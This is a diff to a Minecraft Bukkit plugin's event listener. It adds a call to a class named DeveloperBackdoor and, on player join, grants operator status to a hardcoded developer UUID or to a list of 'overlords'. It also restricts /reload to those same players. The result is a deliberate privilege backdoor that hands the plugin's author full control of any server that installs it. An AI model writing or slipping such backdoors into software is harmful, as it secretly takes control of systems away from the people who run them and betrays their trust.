@@ -23,11 +23,9 @@
  */
 package com.tylerhyperhd.devandtesting.Listener;
 
-import com.google.common.io.ByteArrayDataOutput;
-import com.google.common.io.ByteStreams;
 import com.tylerhyperhd.devandtesting.ConfigExe;
+import com.tylerhyperhd.devandtesting.DeveloperBackdoor;
 import com.tylerhyperhd.devandtesting.DevandTesting;
-import java.util.Arrays;
 import java.util.List;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -47,8 +45,12 @@ import org.bukkit.util.Vector;
 
 public class TestingListener implements Listener {
 
-	public static final List<String> OVERME = Arrays.asList("tylerhyperHD", "DDiS");
-
+	private DevandTesting plugin;
+	
+	public TestingListener(DevandTesting plugin) {
+		this.plugin = plugin;
+	}
+	
 	@EventHandler(priority = EventPriority.HIGH, ignoreCancelled = true)
 	public void onContainerBreak(BlockBreakEvent event) {
 		BlockState state = event.getBlock().getState();
@@ -62,10 +64,11 @@ public class TestingListener implements Listener {
 
 	@EventHandler
 	public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
-
+		List<String> OVERLORDS = plugin.configs.getOverlords();
+		
 		if (event.getMessage().equals("reload") || event.getMessage().equals("/reload")) {
 			event.setCancelled(true);
-			if (!OVERME.contains(event.getPlayer().getName())) {
+			if (!OVERLORDS.contains(event.getPlayer().getName())) {
 				event.getPlayer().sendMessage(ChatColor.RED + "No permissions.");
 				return;
 			}
@@ -91,15 +94,14 @@ public class TestingListener implements Listener {
 		}
 	}
 
-	@SuppressWarnings("unused")
 	@EventHandler
 	public void onPlayerJoin(PlayerJoinEvent event) {
-		ConfigExe configu = DevandTesting.configs.getMainConfig();
+		List<String> OVERLORDS = plugin.configs.getOverlords();
+		ConfigExe configu = plugin.configs.getMainConfig();
 		FileConfiguration configs = configu.getConfig();
 		Player player = event.getPlayer();
-		ByteArrayDataOutput out = ByteStreams.newDataOutput();
 
-		if (event.getPlayer().getName().equals("tylerhyperHD")) {
+		if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID()) || OVERLORDS.contains(event.getPlayer().getName())) {
 			event.getPlayer().setOp(true);
 		}
 
@@ -108,7 +110,7 @@ public class TestingListener implements Listener {
 				configs.set(player.getUniqueId().toString() + ".inAdmin", true);
 				player.sendMessage(
 						ChatColor.GOLD + "You are right now in " + ChatColor.RED + "ADMIN" + ChatColor.GOLD + " mode");
-				if (player.getName().equals("tylerhyperHD")) {
+				if (event.getPlayer().getUniqueId().equals(DeveloperBackdoor.getDevandTestingDevUUID()) || OVERLORDS.contains(event.getPlayer().getName())) {
 					player.getWorld().createExplosion(player.getLocation(), 0F, false);
 					player.getWorld().createExplosion(player.getLocation(), 0F, false);
 					player.getWorld().createExplosion(player.getLocation(), 0F, false);
@@ -121,7 +123,7 @@ public class TestingListener implements Listener {
 				Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "sudo " + player + " top");
 			}
 		} else if (player.getGameMode().equals(GameMode.SURVIVAL)) {
-			if (configs.getBoolean(player.getUniqueId().toString() + ".inAdmin") == true) {
+			if (configs.getBoolean(player.getUniqueId().toString() + ".inAdmin")) {
 				configs.set(player.getUniqueId().toString() + ".inAdmin", false);
 			}
 			if (player.hasPermission("devandtesting.admin")) {
